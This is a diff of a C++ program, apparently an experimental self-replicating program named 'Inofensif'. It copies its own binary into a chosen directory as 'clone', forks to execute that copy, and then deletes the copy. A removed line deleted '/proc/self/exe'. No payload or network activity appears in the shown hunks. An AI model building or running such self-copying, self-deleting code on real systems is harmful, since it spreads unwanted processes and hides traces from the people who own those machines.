@@ -2,10 +2,10 @@
 	COMPILATION:
 
 	mode debug:
-		clang++ -DDEBUG -g3 -fsanitize=leak -fsanitize=address main.cpp
+		clang++ -o clone -DDEBUG -g3 -fsanitize=leak -fsanitize=address main.cpp
 
 	mode discret:
-		clang++ main.cpp
+		clang++ -o clone main.cpp
 */
 #include <iostream>
 #include <filesystem>
@@ -34,6 +34,7 @@ class	Inofensif
 		const Movement					movement;
 		std::vector<std::filesystem::path>		vector_path;
 		const std::filesystem::path			dir_target;
+		std::filesystem::path				to_execute;
 		std::filesystem::path			clone_path; 
 		
 		Movement	choisirMovementAleatoire(void)
@@ -127,19 +128,23 @@ class	Inofensif
 			itself.close();
 			clone.close();
 		}
+
 		void	execute_and_delete_program(void)
 		{
-			const	pid_t pid = fork();
+			std::filesystem::path	to_remove;
+			to_remove = dir_target;
+			to_remove /= "clone";
 			if (debug)
-				std::cout << "PID = " << pid << std::endl;
-			if (pid == 0)
 			{
-				if (debug)
-					std::cout << "clone path: " << clone_path << std::endl;
-				execl(clone_path.filename().c_str(), "clone", NULL);
+				std::cout << "clone path: " << clone_path << std::endl;
+				std::cout << "to remove: " << to_remove << std::endl;
 			}
-			wait(NULL);
-			std::filesystem::remove("/proc/self/exe");
+			std::cout << "to execute: " << to_remove.filename().c_str() << std::endl;
+			const	pid_t pid = fork();
+			if (pid == 0)
+				execl(to_remove.filename().c_str(), "clone", NULL);
+			sleep(2);
+			std::filesystem::remove(to_remove);
 		}
 
 	public:
@@ -147,7 +152,7 @@ class	Inofensif
 					movement(choisirMovementAleatoire()),
 					dir_target(get_dir_target())
 		{
-			sleep(10);
+			sleep(2);
 			if (debug)
 				std::cout << "le repertoire cible est:___________" << dir_target << std::endl;
 			clone_itself();
